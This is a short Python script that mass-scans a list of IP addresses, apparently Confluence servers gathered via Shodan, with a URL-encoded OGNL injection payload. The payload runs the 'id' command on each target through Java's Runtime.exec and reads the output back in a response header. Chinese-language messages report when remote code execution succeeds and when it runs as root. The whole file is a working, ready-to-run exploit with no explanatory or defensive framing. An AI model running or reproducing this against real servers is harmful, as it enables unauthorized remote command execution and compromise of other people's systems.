import requests
def brute(ip):
    cookies = {
        'JSESSIONID': '4FE96872F91ACEEAAD768705EC7B9B6D',
    }
    headers = {
        'Host': '{0}'.format(ip),
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'close',
        #'Cookie': 'JSESSIONID=4FE96872F91ACEEAAD768705EC7B9B6D',
    }
    try:
        response = requests.get('http://{0}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Qualys-Response%22%2C%23a%29%29%7D/'.format(ip), allow_redirects=False, cookies=cookies, headers=headers, verify=False,timeout=10)
        if "X-Qualys-Response" in response.headers:
            print("發現RCE在禁止重定向{0}".format(ip))
            if "root" in response.headers["X-Qualys-Response"]:
                print("root用戶起")
    except Exception as error :
        #print(error)
        pass
    try:
        response = requests.get('http://{0}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Qualys-Response%22%2C%23a%29%29%7D/'.format(ip),  cookies=cookies, headers=headers, verify=False,timeout=10)
        if "X-Qualys-Response" in response.headers:
            print("發現RCE在允許重定向{0}".format(ip))
            if "root" in response.headers["X-Qualys-Response"]:
                print("root用戶起")
    except Exception as error :
        #print(error)
        pass

file = open('/Users/timmy/github/timmy/Shodan/confluence/cnallip.txt','r')
for ip in file.readlines():
    brute(ip.strip())